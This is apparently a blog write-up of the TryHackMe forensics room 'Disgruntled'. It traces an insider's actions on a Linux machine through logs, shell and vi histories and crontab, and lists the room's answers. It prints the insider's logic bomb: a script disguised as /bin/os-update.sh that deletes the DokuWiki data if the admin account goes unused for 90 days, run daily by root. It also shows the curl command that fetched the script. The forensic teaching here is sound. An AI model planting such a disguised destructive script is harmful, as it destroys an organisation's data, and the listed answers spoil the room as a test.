---
layout: post
title: THM CTF Disgruntled
tags: [THM, CTF, Linux, Forensics]
author: NonoHM
date: 2024-03-31 16:08:51
toc:
    sidebar: left
    toc-depth: 3
---

## Task 1 - Introduction

In this room, we will have to investigate into the CyberT's IT departement guy's machine to check if he has done anything malicious to CyberT's assets.

## Task 3 - Nothing suspicious... So far

To start with, we check information about the OS with `cat  /etc/os-release`.

``` sh
NAME="Ubuntu"
VERSION="18.04.5 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.5 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
```

We can see that this is a normal Ubuntu 18.04.5.

Then, we check what are the users on the machine in the `passwd` file.

``` sh
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
cybert:x:1001:1001::/home/cybert:/bin/bash
it-admin:x:1002:1002:,,,:/home/it-admin:/bin/bash
```

These three users are the only "normal" ones available on the system.

When we look into sudoers file, we can see *cybert* and *it-admin* have all privileges on the system.

``` sudoers
# User privilege specification
root    ALL=(ALL:ALL) ALL
cybert  ALL=(ALL:ALL) ALL
it-admin ALL=(ALL:ALL) ALL
```

Instructions gives us a hint to look if there is any installed package using privileged account. Thus, we will look for anyone who had used the `apt` command using `cat /var/log/auth.log* | grep -i apt`.

``` sh
Dec 28 06:19:01 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
```

We can see that user *cybert* has installed *dokuwiki*.

To know what DokuWiki is, it is an open-source wiki software that enables easy collaborative website content management through text files, without requiring a database backend.  

It looks like a normal package to install.

### Questions

**The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?**

*Answer: `/usr/bin/apt install dokuwiki`*

**What was the present working directory (PWD) when the previous command was run?**

*Answer: `/home/cybert`*

## Task 4 - Let’s see if you did anything bad

The instructions here says that IT was supposed to only install a service so we need to check if there is unrelated commands.

We can see it in the cybert's bash history using the command `cat /home/cybert/.bash_history`.

Here are the suspicious commands we could find:

``` sh
sudo adduser it-admin
sudo visudo
su it-admin
exit
sudo passwd root
su root
exit
su root
nano /etc/ssh/sshd_config 
sudo nano /etc/ssh/sshd_config 
```

It seems that the IT guy have added a new user named *it-admin* changed sudoers file, changed root password and sshd configuration.

We can see the sudoers file has been changed by user *cybert* on December 28 at 6:27 AM.

``` sh
Dec 22 07:58:24 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/visudo
Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
```

When looking at the *it-admin*'s bash history with `cat /home/it-admin/.bash_history `, we are able to see a questionable script named *bomb.sh* downloaded by our friend.

``` sh
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
sudo vi bomb.sh
ls
rm bomb.sh
sudo nano /etc/crontab
exit
```

### Questions

**Which user was created after the package from the previous task was installed?**

*Answer: `it-admin`*

**A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)**

*Answer: `Dec 28 06:27:34`*

**A script file was opened using the "vi" text editor. What is the name of this file?**

*Answer: `bomb.sh`*

## Task 5 - Bomb has been planted. But when and where?

Here, we need to know where the script came from and what it contains.

From the previous history command, we saw that the command used to retrieve the script is `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`.

By checking vi history using `cat /home/it-admin/.viminfo`, we see that the file has been saved somewhere else at `/bin/os-update.sh`. This explains why the *bomb.sh* has been deleted.

``` vi
# Command Line History (newest to oldest):
:q!
|2,0,1672208992,,"q!"
:saveas /bin/os-update.sh
|2,0,1672208983,,"saveas /bin/os-update.sh"
```

Using `stat /bin/os-update`, we get information on when it has been last modified.

``` stat
Access: 2022-12-28 06:29:43.998004273 +0000
Modify: 2022-12-28 06:29:43.998004273 +0000
Change: 2022-12-28 06:29:43.998004273 +0000
```

Lastly, we need to know what this script does. In order to know that, we will check its content.

``` bash
# 2022-06-05 - Initial version
# 2022-10-11 - Fixed bug
# 2022-10-15 - Changed from 30 days to 90 days
OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
if [ -z "$OUTPUT" ]; then
        rm -r /var/lib/dokuwiki
        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r
" > /goodbye.txt
fi
```

We are now able to understand what the script does. Firstly, it gets if the user it-admin connected wihtin 90 days. Then, if not, it will erase the dokuwiki site and write a vengeance message into *goodbye.txt*.
This is probably made to piss off the company if our friend got fired. 

### Questions

**What is the command used that created the file bomb.sh?**

*Answer: `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`*

**The file was renamed and moved to a different directory. What is the full path of this file now?**

*Answer: `/bin/os-update.sh`*

**When was the file from the previous question last modified? (Format: Month Day HH:MM)**

*Answer: `Dec 28 06:29`*

**What is the name of the file that will get created when the file from the first question executes?**

*Answer: `goodbye.txt`*

## Task 6 - Following the fuse

Now that we know how the script work, we need to know when it will be executed. We remember that our friend modified crontab file, so will check it with `cat /etc/crontab`.  

``` cron
0 8     * * *   root    /bin/os-update.sh
```

This script will be executed at 8 AM every day by root user.

### Question

**At what time will the malicious file trigger? (Format: HH:MM AM/PM)**

*Answer: `08:00 AM`*

## Task 7 - Conclusion

In summary, our investigation into the Disgruntled THM CTF scenario revealed suspicious actions by an insider in CyberT's IT department. By thoroughly examining user accounts, permissions (sudoers), logs, and command histories (bash and vim), we uncovered a hidden plan to harm the company's systems and found a malicious script intended to cause damage. This script would delete all the files of the dokuwiki if the user has not logged into this machine in the last 90 days.  
This scenario emphasizes the need for strong security measures and proactive threat detection.  
